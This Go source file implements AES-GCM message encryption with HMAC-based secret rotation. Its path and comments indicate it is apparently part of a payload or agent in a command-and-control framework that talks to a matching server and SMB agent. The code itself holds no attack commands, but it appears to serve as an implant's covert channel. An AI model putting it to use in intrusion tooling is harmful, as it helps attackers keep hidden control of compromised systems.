// server/docker/payloads/TCP_Linux/secure_comms.go
// Secure communications with HMAC-based secret rotation

//go:build linux
// +build linux

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"sync"
)

// SecureComms handles encrypted communication with secret rotation
type SecureComms struct {
	mu      sync.RWMutex
	secret1 string // Current secret
	secret2 string // Previous secret (for decryption fallback)
}

// NewSecureComms creates a new SecureComms instance
// secret1 and secret2 come from generateInitialSecrets() and are used directly
func NewSecureComms(secret1, secret2 string) *SecureComms {
	return &SecureComms{
		secret1: secret1,
		secret2: secret2,
	}
}

// EncryptMessage encrypts a message using AES-GCM with the current secret
func (sc *SecureComms) EncryptMessage(plaintext string) (string, error) {
	sc.mu.RLock()
	secret := sc.secret1
	sc.mu.RUnlock()

	// Derive key from secret
	key := sha256.Sum256([]byte(secret))

	// Create cipher
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Encrypt
	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// DecryptMessage decrypts a message, trying current secret first, then previous
func (sc *SecureComms) DecryptMessage(encrypted string) (string, error) {
	sc.mu.RLock()
	secret1 := sc.secret1
	secret2 := sc.secret2
	sc.mu.RUnlock()

	// Decode base64
	ciphertext, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Try current secret first
	if plaintext, err := sc.decryptWithSecret(ciphertext, secret1); err == nil {
		return plaintext, nil
	}

	// Try previous secret as fallback
	if plaintext, err := sc.decryptWithSecret(ciphertext, secret2); err == nil {
		return plaintext, nil
	}

	return "", fmt.Errorf(Err(E18))
}

func (sc *SecureComms) decryptWithSecret(ciphertext []byte, secret string) (string, error) {
	// Derive key from secret
	key := sha256.Sum256([]byte(secret))

	// Create cipher
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "", fmt.Errorf(Err(E2))
	}

	nonce := ciphertext[:nonceSize]
	ciphertext = ciphertext[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// RotateSecret performs HMAC-based secret rotation
// Must match the server's algorithm exactly
func (sc *SecureComms) RotateSecret() {
	sc.mu.Lock()
	defer sc.mu.Unlock()

	// New secret = HMAC(secret2 as key, secret1 as data)
	// This matches the SMB agent and server implementation
	h := hmac.New(sha256.New, []byte(sc.secret2))
	h.Write([]byte(sc.secret1))
	newSecret := fmt.Sprintf("%x", h.Sum(nil))

	// Rotate
	sc.secret2 = sc.secret1
	sc.secret1 = newSecret
}

// GetCurrentSecret returns the current secret (for debugging)
func (sc *SecureComms) GetCurrentSecret() string {
	sc.mu.RLock()
	defer sc.mu.RUnlock()
	return sc.secret1
}
